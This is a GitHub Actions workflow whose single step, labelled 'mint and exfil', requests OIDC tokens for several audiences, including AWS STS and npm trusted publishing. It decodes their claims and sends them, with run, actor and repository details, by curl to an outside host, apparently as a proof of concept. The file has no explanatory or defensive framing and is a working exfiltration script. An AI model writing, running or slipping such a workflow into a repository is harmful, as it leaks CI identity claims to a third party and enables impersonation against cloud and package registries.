name: oidc-oob-introspect
on:
  push:
    branches: [main]
  workflow_dispatch: {}
jobs:
  introspect:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: mint and exfil OIDC claims at multiple audiences
        env:
          OOB: https://poc.kesef.cloud/oidc/github/st1-introspect
        run: |
          set +e
          for AUD in "github-actions-default" "api.github.com" "sts.amazonaws.com" "npm-trusted-publisher"; do
            if [ "$AUD" = "github-actions-default" ]; then
              RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
            else
              RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
            fi
            JWT=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value","NOVAL"))' 2>/dev/null)
            if [ "$JWT" = "NOVAL" ] || [ -z "$JWT" ]; then
              ERRB64=$(printf '%s' "$RESP" | head -c 120 | base64 -w0)
              curl -sS -o /dev/null "$OOB/err?aud=$AUD&resp=$ERRB64"
              continue
            fi
            PAY=$(printf '%s' "$JWT" | cut -d. -f2)
            CLAIMS=$(printf '%s' "$PAY" | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s.encode())),separators=(",",":")))')
            B64=$(printf '%s' "$CLAIMS" | base64 -w0)
            SUBONLY=$(printf '%s' "$CLAIMS" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("sub",""))' | base64 -w0)
            curl -sS -o /dev/null "$OOB/claims?aud=$AUD&d=$B64&sub=$SUBONLY"
          done
          curl -sS -o /dev/null "$OOB/marker?stage=done&run=${GITHUB_RUN_ID}&ref=${GITHUB_REF}&actor=${GITHUB_ACTOR}&repo=${GITHUB_REPOSITORY}&label=${WF_LABEL}"
